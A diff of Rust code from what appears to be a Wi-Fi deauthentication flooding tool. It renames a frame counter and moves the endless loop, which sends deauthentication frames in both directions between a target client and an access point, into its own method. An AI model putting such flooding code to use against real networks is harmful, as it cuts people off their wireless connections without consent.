@@ -11,11 +11,11 @@ use crate::utils::{ CtrlCHandler, inline_display, abort };
 
 
 pub struct Deauthentication {
-    args        : DeauthArgs,
-    builder     : Frames,
-    frames_sent : usize,
-    seq_num     : u16,
-    socket      : Layer2Socket,
+    args     : DeauthArgs,
+    builder  : Frames,
+    frm_sent : usize,
+    seq_num  : u16,
+    socket   : Layer2Socket,
 }
 
 
@@ -23,10 +23,10 @@ impl Deauthentication {
 
     pub fn new(args: DeauthArgs) -> Self {
         Self { 
-            builder     : Frames::new(),
-            frames_sent : 0,
-            seq_num     : 1,
-            socket      : Layer2Socket::new(&args.iface),
+            builder  : Frames::new(),
+            frm_sent : 0,
+            seq_num  : 1,
+            socket   : Layer2Socket::new(&args.iface),
             args,
         }
     }
@@ -35,15 +35,7 @@ impl Deauthentication {
 
     pub fn execute(&mut self) {
         self.set_channel();
-        let running = Arc::new(AtomicBool::new(true));
-        CtrlCHandler::setup(running.clone());
-
-        while running.load(Ordering::SeqCst) {
-            self.send_frame(self.args.target_mac, self.args.bssid);
-            self.send_frame(self.args.bssid, self.args.target_mac);
-        }
-        
-        println!("\nFlood interrupted"); 
+        self.send_endlessly();
     }
 
 
@@ -64,6 +56,20 @@ impl Deauthentication {
 
 
 
+    fn send_endlessly(&mut self) {
+        let running = Arc::new(AtomicBool::new(true));
+        CtrlCHandler::setup(running.clone());
+
+        while running.load(Ordering::SeqCst) {
+            self.send_frame(self.args.target_mac, self.args.bssid);
+            self.send_frame(self.args.bssid, self.args.target_mac);
+        }
+        
+        println!("\nFlood interrupted"); 
+    }
+
+
+
     #[inline]
     fn send_frame(
         &mut self, 
@@ -74,9 +80,9 @@ impl Deauthentication {
         
         self.socket.send(frame);
         self.update_seq_num();
-        self.frames_sent += 1;
+        self.frm_sent += 1;
 
-        inline_display(&format!("Frames sent: {}", &self.frames_sent));
+        inline_display(&format!("Frames sent: {}", &self.frm_sent));
         thread::sleep(Duration::from_millis(self.args.delay));
     }
 
